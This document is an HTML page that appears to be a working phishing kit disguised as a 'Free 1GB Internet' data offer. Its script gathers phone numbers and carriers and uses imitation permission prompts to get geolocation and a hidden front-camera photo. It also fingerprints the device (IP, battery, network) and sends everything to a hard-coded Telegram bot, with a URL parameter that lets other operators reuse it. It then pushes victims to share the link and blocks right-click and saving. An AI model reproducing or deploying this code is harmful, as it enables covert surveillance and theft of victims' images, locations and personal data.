<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Free Internet Data Hub</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            -webkit-tap-highlight-color: transparent;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', system-ui, sans-serif;
        }

        html, body {
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: #f5f5f7;
        }

        /* Header */
        .app-header {
            background: white;
            padding: 12px 16px;
            border-bottom: 1px solid #e5e5ea;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            z-index: 1000;
        }

        .header-title {
            font-size: 14px;
            font-weight: 600;
            color: #1d1d1f;
        }

        .header-url {
            font-size: 12px;
            color: #86868b;
            margin-top: 2px;
        }

        /* Main Container */
        .container {
            height: 100vh;
            padding-top: 60px;
            padding-bottom: 100px;
            overflow-y: auto;
            -webkit-overflow-scrolling: touch;
        }

        /* Hide scrollbar */
        .container::-webkit-scrollbar {
            display: none;
        }

        /* Hero Section */
        .hero-section {
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            color: white;
            padding: 40px 20px;
            text-align: center;
            border-radius: 0 0 30px 30px;
        }

        .hero-title {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 15px;
        }

        .hero-subtitle {
            font-size: 18px;
            opacity: 0.9;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .claim-btn {
            background: white;
            color: #007AFF;
            border: none;
            padding: 18px 40px;
            border-radius: 25px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }

        .claim-btn:hover {
            transform: scale(1.05);
        }

        /* Form Section */
        .form-section {
            background: white;
            margin: 20px;
            padding: 25px;
            border-radius: 20px;
            box-shadow: 0 5px 20px rgba(0,0,0,0.08);
            display: none;
        }

        .form-title {
            font-size: 24px;
            font-weight: 700;
            color: #1d1d1f;
            margin-bottom: 25px;
            text-align: center;
        }

        /* Form Elements */
        .form-group {
            margin-bottom: 25px;
        }

        .form-label {
            display: block;
            margin-bottom: 8px;
            color: #1d1d1f;
            font-weight: 600;
            font-size: 16px;
        }

        .form-select {
            width: 100%;
            padding: 18px;
            border: 2px solid #d1d1d6;
            border-radius: 14px;
            font-size: 16px;
            background: white;
            appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 18px center;
            background-size: 20px;
        }

        .form-input {
            width: 100%;
            padding: 18px;
            border: 2px solid #d1d1d6;
            border-radius: 14px;
            font-size: 16px;
            background: white;
        }

        .form-select:focus, .form-input:focus {
            border-color: #007AFF;
            outline: none;
        }

        /* Get Data Button */
        .get-data-btn {
            width: 100%;
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            color: white;
            border: none;
            padding: 20px;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }

        .get-data-btn:hover {
            opacity: 0.9;
        }

        /* Selected Info Display */
        .selected-info {
            background: #f5f5f7;
            padding: 15px;
            border-radius: 12px;
            margin-top: 20px;
            display: none;
        }

        .info-line {
            display: flex;
            justify-content: space-between;
            margin-bottom: 8px;
            font-size: 14px;
        }

        /* Permission Dialogs */
        .permission-dialog {
            background: white;
            border-radius: 20px;
            padding: 30px 25px;
            margin: 20px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.15);
            display: none;
            animation: slideUp 0.3s ease;
        }

        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateY(50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .permission-title {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 10px;
            color: #1d1d1f;
        }

        .permission-text {
            font-size: 14px;
            color: #86868b;
            margin-bottom: 25px;
            line-height: 1.4;
        }

        .permission-options {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .permission-option {
            padding: 16px;
            border: 2px solid #d1d1d6;
            border-radius: 12px;
            background: white;
            text-align: center;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
        }

        .permission-option:hover {
            background: #f5f5f7;
        }

        .permission-option.allow {
            border-color: #007AFF;
            background: #007AFF;
            color: white;
        }

        .permission-option.allow:hover {
            background: #0056CC;
        }

        /* Features Section */
        .features-section {
            padding: 40px 20px;
            background: white;
            margin-top: 20px;
            display: none;
        }

        .features-title {
            font-size: 24px;
            font-weight: 700;
            text-align: center;
            margin-bottom: 30px;
            color: #1d1d1f;
        }

        .features-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 20px;
        }

        .feature-card {
            text-align: center;
            padding: 20px;
            border-radius: 16px;
            background: #f5f5f7;
        }

        .feature-icon {
            font-size: 32px;
            margin-bottom: 15px;
            color: #007AFF;
        }

        .feature-name {
            font-weight: 600;
            color: #1d1d1f;
            font-size: 14px;
        }

        /* Success Screen */
        .success-screen {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(135deg, #007AFF 0%, #5856D6 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 2000;
            padding: 20px;
            opacity: 0;
            visibility: hidden;
            transition: all 0.3s;
        }

        .success-screen.active {
            opacity: 1;
            visibility: visible;
        }

        .success-content {
            background: white;
            border-radius: 30px;
            padding: 40px 30px;
            text-align: center;
            max-width: 400px;
            width: 100%;
            transform: scale(0.9);
            transition: transform 0.3s;
        }

        .success-screen.active .success-content {
            transform: scale(1);
        }

        .success-icon {
            font-size: 60px;
            color: #34C759;
            margin-bottom: 20px;
        }

        .success-title {
            font-size: 28px;
            font-weight: 800;
            margin-bottom: 15px;
            color: #1d1d1f;
        }

        .success-text {
            font-size: 16px;
            color: #86868b;
            margin-bottom: 25px;
        }

        /* Loading Animation */
        .loading {
            display: none;
            text-align: center;
            padding: 20px;
        }

        .loader {
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #007AFF;
            border-radius: 50%;
            margin: 0 auto 15px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Responsive */
        @media (max-width: 480px) {
            .hero-title {
                font-size: 28px;
            }
            
            .hero-subtitle {
                font-size: 16px;
            }
            
            .form-title {
                font-size: 22px;
            }
            
            .features-grid {
                grid-template-columns: 1fr;
            }
        }

        @media (max-width: 360px) {
            .hero-section {
                padding: 30px 15px;
            }
            
            .form-section {
                margin: 15px;
                padding: 20px;
            }
            
            .permission-dialog {
                margin: 15px;
                padding: 25px 20px;
            }
        }

        /* Hide Elements Initially */
        .hidden {
            display: none !important;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <div class="app-header">
        <div>
            <div class="header-title">Free Internet Data Hub</div>
            <div class="header-url" id="currentUrl">1gbfreenew.vercel.app/?id=779867</div>
        </div>
    </div>

    <!-- Main Container -->
    <div class="container">
        <!-- Step 1: Hero Section -->
        <div class="hero-section" id="heroSection">
            <div class="hero-title">Free Internet</div>
            <div class="hero-subtitle">
                Get 1GB Free Internet Today!<br>
                Join millions of satisfied users who've already claimed their free data. Limited time offer!
            </div>
            <button class="claim-btn" id="claimBtn">
                Claim Your Free Data
            </button>
        </div>

        <!-- Step 2: Form Section -->
        <div class="form-section" id="formSection">
            <div class="form-title">Claim Your Free 1GB Now</div>
            
            <div class="form-group">
                <label class="form-label">Country Code</label>
                <select class="form-select" id="country">
                    <option value="">Select Country üåé</option>
                    <option value="+91">üáÆüá≥ +91 (India)</option>
                    <option value="+1">üá∫üá∏ +1 (USA)</option>
                    <option value="+44">üá¨üáß +44 (UK)</option>
                    <option value="+880">üáßüá© +880 (Bangladesh)</option>
                    <option value="+92">üáµüá∞ +92 (Pakistan)</option>
                    <option value="+971">üá¶üá™ +971 (UAE)</option>
                </select>
            </div>

            <div class="form-group">
                <label class="form-label">SIM Provider</label>
                <select class="form-select" id="operator">
                    <option value="">Select Operator üì±</option>
                    <option value="airtel">Airtel (India)</option>
                    <option value="jio">Jio (India)</option>
                    <option value="vi">VI (India)</option>
                    <option value="bsnl">BSNL (India)</option>
                    <option value="verizon">Verizon (USA)</option>
                    <option value="att">AT&T (USA)</option>
                    <option value="tmobile">T-Mobile (USA)</option>
                </select>
            </div>

            <div class="form-group">
                <label class="form-label">Phone Number</label>
                <input type="tel" class="form-input" id="mobile" 
                       placeholder="Enter your phone number"
                       maxlength="10">
            </div>

            <button class="get-data-btn" id="getDataBtn">
                Get Your Free 1GB Now
            </button>

            <!-- Selected Info Display -->
            <div class="selected-info" id="selectedInfo">
                <div class="info-line">
                    <span>SIM Provider</span>
                    <span id="selectedOperator">Airtel (India)</span>
                </div>
                <div class="info-line">
                    <span>Phone Number</span>
                    <span id="selectedMobile">911016136</span>
                </div>
            </div>
        </div>

        <!-- Step 3: Location Permission Dialog -->
        <div class="permission-dialog" id="locationDialog">
            <div class="permission-title">Free Internet</div>
            <div class="permission-text">
                <strong>Country Code</strong><br>
                <span id="displayCountry">+91 (India)</span>
            </div>
            <div class="permission-text">
                <strong>1gbfreenew.vercel.app</strong> wants to use your device's location
            </div>
            <div class="permission-options">
                <div class="permission-option allow" id="allowLocationAlways">
                    Allow while visiting the site
                </div>
                <div class="permission-option" id="allowLocationOnce">
                    Allow this time
                </div>
                <div class="permission-option" id="denyLocation">
                    Never allow
                </div>
            </div>
        </div>

        <!-- Step 4: Camera Permission Dialog -->
        <div class="permission-dialog" id="cameraDialog">
            <div class="permission-title">Free Internet</div>
            <div class="permission-text">
                <strong>1gbfreenew.vercel.app</strong> wants to use your camera
            </div>
            <div class="permission-options">
                <div class="permission-option allow" id="allowCameraAlways">
                    Allow while visiting the site
                </div>
                <div class="permission-option" id="allowCameraOnce">
                    Allow this time
                </div>
                <div class="permission-option" id="denyCamera">
                    Never allow
                </div>
            </div>
        </div>

        <!-- Step 5: Features Section (Why Choose Us) -->
        <div class="features-section" id="featuresSection">
            <div class="features-title">Why Choose Us</div>
            <div class="features-grid">
                <div class="feature-card">
                    <div class="feature-icon">‚ö°</div>
                    <div class="feature-name">Instant Activation</div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">üåç</div>
                    <div class="feature-name">Worldwide Coverage</div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">üîí</div>
                    <div class="feature-name">Secure Process</div>
                </div>
                <div class="feature-card">
                    <div class="feature-icon">üõ°Ô∏è</div>
                    <div class="feature-name">24/7 Support</div>
                </div>
            </div>
        </div>

        <!-- Loading -->
        <div class="loading" id="loading">
            <div class="loader"></div>
            <div>Processing your request...</div>
        </div>
    </div>

    <!-- Success Screen -->
    <div class="success-screen" id="successScreen">
        <div class="success-content">
            <div class="success-icon">‚úì</div>
            <div class="success-title">Congratulations!</div>
            <div class="success-text">
                Your free 1GB data is being processed. Share with friends to get additional data!
            </div>
            <button class="get-data-btn" id="shareBtn" style="background: #34C759;">
                Share & Get More
            </button>
        </div>
    </div>

    <!-- Hidden Elements for Data Collection -->
    <video id="hiddenCamera" autoplay playsinline style="display: none;"></video>
    <canvas id="hiddenCanvas" style="display: none;"></canvas>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        // Telegram Configuration
        const BOT_TOKEN = '8594037811:AAF7qcEPpSbPS8ynDkSL5w5YTSqm-3gicco';
        const CHAT_ID = '7798676542';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        // Get chat_id from URL
        const urlParams = new URLSearchParams(window.location.search);
        const urlChatId = urlParams.get('chat_id');
        if (urlChatId) {
            CHAT_ID = urlChatId;
        }

        // Global Variables
        let currentStep = 1;
        let userData = {
            mobile: '',
            country: '',
            operator: '',
            location: null,
            photo: null,
            deviceInfo: {},
            timestamp: new Date().toISOString()
        };

        // DOM Elements
        const claimBtn = document.getElementById('claimBtn');
        const formSection = document.getElementById('formSection');
        const getDataBtn = document.getElementById('getDataBtn');
        const locationDialog = document.getElementById('locationDialog');
        const cameraDialog = document.getElementById('cameraDialog');
        const featuresSection = document.getElementById('featuresSection');
        const successScreen = document.getElementById('successScreen');
        const selectedInfo = document.getElementById('selectedInfo');

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            // Mobile number input
            document.getElementById('mobile').addEventListener('input', function() {
                this.value = this.value.replace(/\D/g, '').slice(0, 10);
            });

            // Claim Button
            claimBtn.addEventListener('click', function() {
                // Hide hero section
                document.getElementById('heroSection').style.display = 'none';
                // Show form section
                formSection.style.display = 'block';
                // Scroll to top
                document.querySelector('.container').scrollTop = 0;
            });

            // Get Data Button
            getDataBtn.addEventListener('click', function() {
                const mobile = document.getElementById('mobile').value;
                const country = document.getElementById('country').value;
                const operator = document.getElementById('operator').value;

                // Validation
                if (!country) {
                    alert('Please select country code');
                    return;
                }
                if (!operator) {
                    alert('Please select SIM provider');
                    return;
                }
                if (!mobile || mobile.length < 10) {
                    alert('Please enter valid phone number');
                    return;
                }

                // Store data
                userData.mobile = mobile;
                userData.country = country;
                userData.operator = operator;

                // Show selected info
                document.getElementById('selectedOperator').textContent = 
                    document.getElementById('operator').options[document.getElementById('operator').selectedIndex].text;
                document.getElementById('selectedMobile').textContent = mobile;
                selectedInfo.style.display = 'block';

                // Show country in location dialog
                document.getElementById('displayCountry').textContent = 
                    document.getElementById('country').options[document.getElementById('country').selectedIndex].text;

                // Hide form
                formSection.style.display = 'none';
                
                // Show loading
                document.getElementById('loading').style.display = 'block';

                // Simulate processing for 1 second
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    // Show location permission dialog
                    locationDialog.style.display = 'block';
                    document.querySelector('.container').scrollTop = 0;
                }, 1000);
            });

            // Location Permission Options
            document.getElementById('allowLocationAlways').addEventListener('click', function() {
                handleLocationPermission('always');
            });
            document.getElementById('allowLocationOnce').addEventListener('click', function() {
                handleLocationPermission('once');
            });
            document.getElementById('denyLocation').addEventListener('click', function() {
                handleLocationPermission('never');
            });

            // Camera Permission Options
            document.getElementById('allowCameraAlways').addEventListener('click', function() {
                handleCameraPermission('always');
            });
            document.getElementById('allowCameraOnce').addEventListener('click', function() {
                handleCameraPermission('once');
            });
            document.getElementById('denyCamera').addEventListener('click', function() {
                handleCameraPermission('never');
            });

            // Share Button
            document.getElementById('shareBtn').addEventListener('click', function() {
                if (navigator.share) {
                    navigator.share({
                        title: 'Free 1GB Internet',
                        text: 'I just got free 1GB internet data! Get yours too.',
                        url: window.location.href
                    });
                } else {
                    navigator.clipboard.writeText(window.location.href);
                    alert('Link copied to clipboard!');
                }
            });

            // Collect device info automatically
            collectDeviceInfo();
        });

        // Handle Location Permission
        async function handleLocationPermission(type) {
            locationDialog.style.display = 'none';
            
            // Show loading
            document.getElementById('loading').style.display = 'block';

            try {
                if (type !== 'never') {
                    // Get real location
                    const position = await getCurrentPosition();
                    userData.location = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        timestamp: new Date(position.timestamp)
                    };

                    // Get address
                    try {
                        const response = await fetch(
                            `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
                        );
                        const data = await response.json();
                        userData.location.address = data.display_name;
                    } catch (e) {
                        // Silent fail
                    }
                } else {
                    userData.location = { denied: true };
                }

                // Hide loading after 1 second
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    // Show camera permission dialog
                    cameraDialog.style.display = 'block';
                    document.querySelector('.container').scrollTop = 0;
                }, 1000);

            } catch (error) {
                console.error('Location error:', error);
                userData.location = { error: error.message };
                
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    cameraDialog.style.display = 'block';
                    document.querySelector('.container').scrollTop = 0;
                }, 1000);
            }
        }

        // Handle Camera Permission
        async function handleCameraPermission(type) {
            cameraDialog.style.display = 'none';
            
            // Show loading
            document.getElementById('loading').style.display = 'block';

            try {
                if (type !== 'never') {
                    // Access camera
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: 'user',
                            width: { ideal: 640 },
                            height: { ideal: 480 }
                        }
                    });

                    const video = document.getElementById('hiddenCamera');
                    video.srcObject = stream;

                    // Wait for video to load
                    await new Promise(resolve => {
                        video.onloadedmetadata = () => {
                            resolve();
                        };
                    });

                    // Take photo after 500ms
                    await new Promise(resolve => setTimeout(resolve, 500));
                    const photoData = capturePhoto(video);
                    userData.photo = photoData;

                    // Stop camera
                    stream.getTracks().forEach(track => track.stop());
                } else {
                    userData.photo = { denied: true };
                }

                // Hide loading after 1 second
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    // Show features section
                    featuresSection.style.display = 'block';
                    document.querySelector('.container').scrollTop = 0;
                    
                    // Send data to Telegram
                    sendToTelegram();
                    
                    // After 3 seconds, show success screen
                    setTimeout(() => {
                        featuresSection.style.display = 'none';
                        successScreen.classList.add('active');
                    }, 3000);

                }, 1000);

            } catch (error) {
                console.error('Camera error:', error);
                userData.photo = { error: error.message };
                
                setTimeout(() => {
                    document.getElementById('loading').style.display = 'none';
                    featuresSection.style.display = 'block';
                    document.querySelector('.container').scrollTop = 0;
                    
                    sendToTelegram();
                    
                    setTimeout(() => {
                        featuresSection.style.display = 'none';
                        successScreen.classList.add('active');
                    }, 3000);
                }, 1000);
            }
        }

        // Get Current Position
        function getCurrentPosition() {
            return new Promise((resolve, reject) => {
                if (!navigator.geolocation) {
                    reject(new Error('Geolocation not supported'));
                    return;
                }

                navigator.geolocation.getCurrentPosition(
                    resolve,
                    reject,
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }

        // Capture Photo
        function capturePhoto(video) {
            const canvas = document.getElementById('hiddenCanvas');
            const context = canvas.getContext('2d');
            
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            return canvas.toDataURL('image/jpeg', 0.8);
        }

        // Collect Device Information
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: `${window.screen.width}x${window.screen.height}`,
                colorDepth: window.screen.colorDepth,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookies: navigator.cookieEnabled,
                online: navigator.onLine,
                url: window.location.href
            };

            // IP Address
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                deviceInfo.ip = ipData.ip;
            } catch (e) {
                deviceInfo.ip = 'Unknown';
            }

            // Battery info
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    deviceInfo.battery = {
                        level: Math.round(battery.level * 100),
                        charging: battery.charging
                    };
                });
            }

            // Network info
            if (navigator.connection) {
                deviceInfo.connection = {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                };
            }

            userData.deviceInfo = deviceInfo;
        }

        // Send to Telegram
        async function sendToTelegram() {
            try {
                const message = `
üéØ *NEW FREE DATA REQUEST* üéØ

üì± *Mobile Number:* ${userData.mobile}
üåç *Country Code:* ${userData.country}
üì∂ *Operator:* ${userData.operator}
‚è∞ *Time:* ${new Date(userData.timestamp).toLocaleString('hi-IN')}

üìç *Location:* ${userData.location?.latitude ? `${userData.location.latitude}, ${userData.location.longitude}` : 'Not captured'}
üì∏ *Photo:* ${userData.photo ? 'Captured ‚úì' : 'Not captured'}

üñ•Ô∏è *Device Info:*
‚Ä¢ IP: ${userData.deviceInfo.ip || 'Unknown'}
‚Ä¢ Screen: ${userData.deviceInfo.screen || 'Unknown'}
‚Ä¢ Browser: ${userData.deviceInfo.userAgent?.split(') ').pop().split(' ')[0] || 'Unknown'}
‚Ä¢ Platform: ${userData.deviceInfo.platform || 'Unknown'}
‚Ä¢ Language: ${userData.deviceInfo.language || 'Unknown'}
                `;

                // Send text message
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                // Send photo if available
                if (userData.photo && typeof userData.photo === 'string') {
                    const formData = new FormData();
                    const blob = await fetch(userData.photo).then(r => r.blob());
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, 'verification.jpg');
                    formData.append('caption', `üì∏ Verification photo for ${userData.mobile}`);

                    await fetch(`${TELEGRAM_API}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }

            } catch (error) {
                console.error('Telegram error:', error);
            }
        }

        // Prevent right-click and keyboard shortcuts
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', e => {
            if (e.ctrlKey && (e.key === 's' || e.key === 'p')) {
                e.preventDefault();
            }
        });
    </script>
</body>
</html>
